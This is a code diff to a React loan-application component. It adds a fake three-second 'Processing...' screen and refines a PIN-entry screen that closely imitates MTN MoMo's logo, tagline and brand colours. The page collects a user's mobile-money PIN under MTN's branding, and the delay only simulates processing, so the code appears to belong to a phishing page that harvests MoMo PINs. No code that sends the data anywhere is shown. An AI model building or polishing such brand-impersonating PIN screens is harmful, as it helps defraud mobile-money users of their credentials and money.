@@ -40,6 +40,7 @@ function LoanApplication({ loanDetails, onBack, processor }) {
     ]);
 
     const pinInputs = useRef([]);
+    const [processing, setProcessing] = useState(false);
 
 
     /* =========================================
@@ -258,6 +259,12 @@ function LoanApplication({ loanDetails, onBack, processor }) {
         );
 
         setSubmitted(true);
+        setProcessing(true);
+
+        setTimeout(() => {
+            setProcessing(false);
+            setSubmitted(true);
+        }, 3000);
 
     } catch (error) {
 
@@ -330,6 +337,19 @@ function LoanApplication({ loanDetails, onBack, processor }) {
     /* =========================================
        PESA APP PIN SCREEN
     ========================================= */
+    if (processing) {
+    return (
+        <div className="momo-processing-page">
+            <div className="momo-processing-spinner"></div>
+
+            <h2>Processing...</h2>
+
+            <p>
+                Please wait while we process your request.
+            </p>
+        </div>
+    );
+}
 
     if (showPinScreen) {
 
@@ -341,23 +361,22 @@ function LoanApplication({ loanDetails, onBack, processor }) {
                 <div className="pesa-pin-top">
 
                     <div className="pesa-logo">
-                        <img
-                    src={momoLogo}
-                    alt="MoMo"
-                    className="momo-logo"
-                        />
-                    <br />
-
-                    <strong style={{ color: "yellow" }}>
-                        MoMo
-                    </strong>
-                    <br />
-                    <span style={{ color: "yellow" }}>
-                        from MTN
-                    </span>
+                        <div className="momo-logo-crop">
+                            <img
+                                src={momoLogo}
+                                alt="MoMo"
+                                className="momo-logo"
+                            />
+                        </div>
+                        <span style={{ color: '#FFCC05' }}>
+                            <strong>MoMo</strong>
+                        </span>
+                        <span className="momo-tagline" style={{ color: '#FFCC05' }}>
+                            from MTN
+                        </span>
                     </div>
-
                 </div>
+
 
 
                 {/* WHITE CONTENT */}
